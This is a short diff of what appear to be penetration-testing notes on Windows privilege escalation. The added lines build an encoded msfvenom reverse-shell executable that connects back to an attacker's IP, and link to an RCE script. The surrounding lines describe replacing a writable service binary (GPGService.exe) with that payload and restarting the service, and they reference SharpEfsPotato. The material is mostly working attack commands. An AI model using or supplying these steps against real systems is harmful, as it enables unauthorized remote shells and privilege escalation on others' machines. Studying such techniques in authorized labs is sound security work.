@@ -1522,9 +1522,10 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 - YOU CAN MODIFY THIS SERVICE: AllAccess
 - File Permissions: Users [WriteData/CreateFiles]
 - Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
-
+- Created msfvenom payload using this script [Github](https://github.com/lof1sec/mobile_mouse_rce/blob/main/mobile_mouse_rce.py)
 
 ```powershell
+msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=<KaliIP> LPORT=<Listening Port> -f exe -o shell.exe
 # Check the above information why I used GPGOrchestrator to start GPGService.exe, First i replaced the GPGService.exe with msfvenom payload.
 Restart-Service 'GPGOrchestrator'
 sc start 
